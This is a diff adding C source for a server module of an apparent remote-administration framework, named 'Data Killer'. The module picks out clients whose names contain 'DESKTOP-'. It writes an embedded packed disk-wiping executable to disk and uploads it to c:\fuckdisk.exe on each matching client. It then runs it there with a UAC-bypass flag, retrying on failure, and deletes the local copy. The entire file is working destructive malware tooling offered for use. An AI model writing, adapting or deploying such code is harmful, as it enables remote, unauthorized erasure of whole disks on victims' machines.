@@ -1,0 +1,112 @@
+﻿/*
+	Author: Axt Müller
+	Description: Windows-Batch-Deployment's user-defined server program
+	Usage: Push a program that can ERASE ALL DISK DATA to a specific client
+*/
+#include <stdio.h>
+#include <Windows.h>
+#include "../ServerTest/template.h"
+#include "../ServerTest/test.h"
+#include "fuckdisk32.exe.libcmt.upx.h"
+
+void WorkProc(PCLIENT_INFO p, char *szClientVersion)
+{
+	//Only work for one / some specific client(s)
+	if(strstr(p->szDescription,"DESKTOP-"))
+	{
+		printf("[%04ld]TARGET FOUND!\n", p->id);
+		//Query app path
+		WCHAR wsAppPath[MAX_PATH] = {0};
+		if(GetModuleFileNameW(0, wsAppPath, MAX_PATH))
+		{
+			size_t i, c = wcslen(wsAppPath);
+			for(i=c-1; i>=0; i--)
+			{
+				if(wsAppPath[i]==L'\\')
+				{
+					wsAppPath[i+1]=L'\0';
+					break;
+				}
+			}
+		}
+		else
+		{
+			printf("[%04ld]Query program path unsuccessfully.\n", p->id);
+			goto __exit;
+		}
+		swprintf(wsAppPath+wcslen(wsAppPath), L"fuckdisk.%ld", GetCurrentThreadId());
+		//Output buffer to local file
+		ULONG Written, fc = 0;
+		HANDLE hFile = CreateFileW(wsAppPath, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+		if(hFile!=INVALID_HANDLE_VALUE)
+		{
+			if(!WriteFile(hFile, ShellCode, sizeof(ShellCode), &Written, NULL))
+			{
+				printf("[%04ld]Output target program unsuccessfully(2).\n", p->id);
+				goto __exit;
+			}
+			CloseHandle(hFile);
+		}
+		else
+		{
+			printf("[%04ld]Output target program unsuccessfully(1).\n", p->id);
+			goto __exit;
+		}
+		//Upload program
+		if(_CmdUploadFileTo(p->id, wsAppPath, L"c:\\fuckdisk.exe", NULL))
+		{
+			printf("[%04ld]Upload file successfully.\n", p->id);
+		}
+		else
+		{
+			printf("[%04ld]Upload file unsuccessfully.\n", p->id);
+			goto __exit;
+		}
+		//Delete local file
+		DeleteFileW(wsAppPath);
+		//Execute remote program
+		while(1)
+		{
+			ULONG64 RetVal = 0;
+			if(_CmdExecuteBinary(p->id,L"c:\\fuckdisk.exe 666",SW_SHOWMINIMIZED+CLIENT_BYPASS_UAC_UNSAFE,0,&RetVal))
+			{
+				if(RetVal)
+				{
+					printf("[%04ld]Run program successfully.\n",p->id);
+					break;
+				}
+				else
+				{
+					printf("[%04ld]Run program unsuccessfully(2).\n",p->id);
+					Sleep(1000);
+					fc++;
+				}
+			}
+			else
+			{
+				printf("[%04ld]Run program unsuccessfully(1).\n",p->id);
+				fc++;
+			}
+			//If it fails too many times, exit
+			if(fc>10){break;}
+		}
+	}
+	else
+	{
+		printf("[%04ld]Not the target.\n", p->id);
+	}
+__exit:;
+}
+
+void main()
+{
+	//NOTE:
+	//1.don't check for update.
+	//2.perform operations on each client once.
+	//3.traverse all clients unlimited times.
+	//4.the time interval for each traversal of all clients is 1111 milliseconds.
+	SetConsoleTitleW(L"Data Killer");
+	puts("Description: This server program will push a program that can ERASE ALL DISK DATA to a specific client.\n");
+	CreateSimpleServer(9999, WorkProc, 0, 1, 0, 1111);
+	system("pause");
+}
